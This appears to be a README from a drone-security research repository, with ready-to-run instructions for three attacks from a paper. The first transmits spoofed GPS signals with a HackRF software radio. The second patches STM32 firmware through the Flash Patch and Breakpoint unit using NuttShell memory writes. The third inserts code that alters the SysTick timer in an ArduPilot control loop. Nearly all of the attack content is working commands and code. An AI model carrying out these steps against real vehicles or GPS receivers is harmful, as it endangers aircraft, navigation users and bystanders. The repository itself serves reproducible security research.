# Attack cases mentioned in the paper
Code for conducting attacks mentioned in the paper. We have 2 zero-day attacks which have been reported to respective authorities as well. 

## GPS Spoofing
### Prerequisite
1) You need to have a software-defined radio like <a href="https://greatscottgadgets.com/hackrf/one/" target="_blank">HackRF One</a> which could simulate GPS L1 signal. 
2) Install HackRF package
```bash
sudo apt-get update -y
sudo apt-get install -y hackrf
```

3) Install <a href="https://github.com/osqzss/gps-sdr-sim" target="_blank"> GPS position simulator</a>


### How to execute it?
1) You need to specify the GPS satellite constellation through a GPS broadcast ephemeris file. The daily GPS broadcast ephemeris file (brdc) is a merge of the individual site navigation files into one. The archive for the daily file is:ftp://cddis.gsfc.nasa.gov/gnss/data/daily/

2) Find the latest brdc file for navigation data creation

3) When you use <a href="https://github.com/purseclab/M2MON/tree/main/attacks/GPS_spoofing" target="_blank"> brdc3540.14n</a> as an ephemeris file, you can generate GPS messages by using the command in the below. 
```bash
./gps-sdr-sim -b 8 -e brdc3540.14n -l 31.286502,121.032669,100
```

4) gpssim.bin will be created and the file needs to transferred

5) Spoof the GPS messages 
```bash
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
```

## FPB (Flash Patch and Breakpoint Unit) attack
### Prerequisite
1) Your main system-on-Chip must be equipped with a FPB unit. We used <a href="https://www.st.com/en/microcontrollers-microprocessors/stm32f427-437.html" target="_blank">STM32F427</a>.

2) RTOS can execute shell commands (e.g., mw and mh).

### How to execute it?
1) Connect NSH (NuttShell) on a command window
```bash
module load nsh
nsh start
```
2) Activate the FPB unit and execute a new command
```bash
mw 0xE0002004=0x20000000 1
mh 0x20000014=0xe7fe 1
mw 0xE0002000=0x1 1
mw 0xE000201C=0x0807efb9 1
```

## Timer attack
### Prerequisite
1) You need to know a value of the SysTick register (STK_LOAD). You can probably find such a register address on datasheet or source code of the RTOS (NuttX).

### How to conduct the attack?
1) Insert the code snippet in the below to a control loop (e.g., Copter::one_hz_loop() in ArduPilot)
```bash
// 0xE000E014: STK_LOAD’s register address
volatile unsigned int *Timer_attack = (volatile unsigned int *) 0xE000E014;

// Increasing the value to 2X of the original value (0x2903F) set by the RTOS
*Timer_attack = 335998;
```

2) You can confirm the effect of the timer attack after booting.
<img src="https://github.com/purseclab/M2MON/blob/main/attacks/timer_attack/result.png">


